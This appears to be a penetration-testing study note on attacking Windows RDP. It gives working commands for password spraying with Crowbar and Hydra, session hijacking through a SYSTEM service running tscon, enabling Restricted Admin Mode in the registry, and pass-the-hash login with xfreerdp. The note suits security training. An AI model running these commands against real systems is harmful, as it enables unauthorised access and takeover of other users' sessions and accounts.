
[Remote Desktop Protocol (RDP)](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection.

Ports-
- TCP/3389

#### Enum
```bash
nmap -Pn -p3389 192.168.2.143
```

---
## Password Spraying

Using the [Crowbar](https://github.com/galkan/crowbar) tool
```bash
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```


Using Hydra
```bash
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

---
### Logging in to RDP

[[4. RDP]]

---
## RDP Session Hijacking
_Note: This method no longer works on Server 2019._

If you already control the machine with Administrator rights, and another user is logged in via RDP, you can jump into their session without knowing their password.

## **WHY does this work?**

Windows internally allows a SYSTEM-level process to switch between existing sessions using a built-in tool called **tscon.exe**.

- Admin → not enough privilege
- SYSTEM → enough privilege

That’s the only trick.

Once you become SYSTEM, you can impersonate any logged-in RDP user without credentials.

### Step 1: Confirm who is logged in
`query user`
![[Pasted image 20251206161712.png]]

### Step 2: Get SYSTEM privileges

Admin isn't enough, so you create a fake Windows service:

`sc.exe create sessionhijack binpath= "cmd.exe /k tscon 4 /dest:rdp-tcp#13"`

This service will run:

- as SYSTEM (because services run as SYSTEM),
- executing `tscon`,
- switching to session **4**,(It works by specifying which `SESSION ID` (`4` for the `lewen` session in our example))
- using your current RDP session name (`rdp-tcp#13` in the example).
![[Pasted image 20251206162007.png]]
### Step 3: Start the service

`net start sessionhijack`

we now get their access

---
## RDP Pass-the-Hash (PtH)

Only if the system has a feature called **Restricted Admin Mode** enabled, RDP begins to accept NTLM authentication — meaning **hash-based authentication works**.

Keep in mind that this will not work against every Windows system we encounter, but it is always worth trying in a situation where we have an NTLM hash, know the user has RDP rights against a machine or set of machines, and GUI access would benefit us in some ways towards fulfilling the goal of our assessment.

So the entire trick is:

1. Get the NTLM hash of a user (via SAM dump, LSASS dump, etc.)
2. Enable Restricted Admin Mode on target
3. Use `xfreerdp` with `/pth:` option
4. BOOM — you log in via RDP as that user _without ever knowing the password_.

#### Adding the DisableRestrictedAdmin Registry Key

Set it using:

`reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

![[Pasted image 20251206162754.png]]

Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:
```shell-session
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

---
Live example - Pass the hash
![[Pasted image 20251206165205.png]]

![[Pasted image 20251206165517.png]]

![[Pasted image 20251206165612.png]]
